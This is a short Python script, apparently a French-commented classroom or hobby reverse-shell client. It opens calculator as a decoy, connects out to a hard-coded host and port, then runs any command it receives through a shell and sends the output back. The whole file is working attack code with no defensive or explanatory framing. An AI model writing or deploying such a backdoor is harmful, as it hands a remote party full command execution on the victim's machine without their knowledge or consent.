# # # # # # #
# CLIENT.PY #
# # # # # # #


# Import des modules nécessaires au serveur Python
import socket, subprocess, os

os.system('calc.exe')
def main():
    s = socket.socket()
    host = '10.3.100.19'
    port = 12345
    s.connect((host, port))

    while True:
        data = s.recv(1024)
        if (len(data) > 0):
            if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))
                s.send(str.encode("\n" + str(os.getcwd())))
            else:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                outBytes = cmd.stdout.read() + cmd.stderr.read()
                outStr = str(outBytes, "latin1")
                s.send(str.encode(outStr + "\n" + str(os.getcwd())))

main()
